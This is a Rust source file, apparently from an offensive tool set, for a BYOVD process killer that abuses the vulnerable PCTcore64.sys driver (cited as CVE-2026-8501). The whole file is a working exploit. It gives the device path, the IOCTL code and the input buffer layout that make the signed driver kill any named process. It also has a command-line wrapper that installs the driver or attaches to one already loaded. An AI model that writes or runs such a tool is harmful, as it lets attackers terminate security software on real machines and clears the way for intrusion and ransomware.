use byovd_lib::{get_pid_by_name, send_ioctl, DriverConfig, Result};
use clap::Parser;
use winapi::um::winnt::{GENERIC_READ, GENERIC_WRITE};

// ============================================================================
// Driver Configuration -- PCTcore64.sys (PC Tools Internet Security)
// CVE-2026-8501 / VU#158530
// ============================================================================

struct PCTcore64Driver;

impl DriverConfig for PCTcore64Driver {
    fn driver_name(&self) -> &str {
        "PCTcore64"
    }

    fn driver_file(&self) -> &str {
        "PCTcore64.sys"
    }

    fn device_path(&self) -> &str {
        "\\\\.\\PCTCoreDriver"
    }

    fn ioctl_code(&self) -> u32 {
        0x80008644
    }

    fn build_ioctl_input(&self, pid: u32, _process_name: &str) -> Vec<u8> {
        // { pid: ULONG_PTR (+0x00), exit_code: DWORD (+0x08), pad (+0x0C) } = 0x10 bytes
        // Driver checks InputBufferLength >= 0x10
        let mut buf = vec![0u8; 0x10];
        buf[..8].copy_from_slice(&(pid as u64).to_ne_bytes());
        buf
    }

    fn device_access(&self) -> u32 {
        GENERIC_READ | GENERIC_WRITE
    }

    fn ioctl_output_size(&self) -> usize {
        4
    }
}

// ============================================================================
// CLI
// ============================================================================

#[derive(Parser)]
#[command(name = "PCTcore64-Killer", version, author = "BlackSnufkin")]
#[command(about = "BYOVD process killer using PCTcore64 driver (CVE-2026-8501)")]
struct Cli {
    /// Target process name (e.g., notepad.exe)
    #[arg(short = 'n', long = "name", required = true)]
    process_name: String,

    /// Attach to an already-loaded driver -- skip service install/start/stop
    #[arg(short = 'a', long = "attach")]
    attach: bool,
}

// ============================================================================
// Main
// ============================================================================

fn main() -> Result<()> {
    let cli = Cli::parse();
    let driver = PCTcore64Driver;

    if cli.attach {
        println!("[*] Attach mode: assuming driver is already loaded");
        let pid = get_pid_by_name(&cli.process_name)
            .ok_or_else(|| format!("Process '{}' not found", cli.process_name))?;
        println!("[*] Target {} -> PID {}", cli.process_name, pid);
        send_ioctl(&driver, pid, &cli.process_name)?;
        println!("[+] IOCTL dispatched");
        Ok(())
    } else {
        byovd_lib::run(&driver, &cli.process_name, None)
    }
}
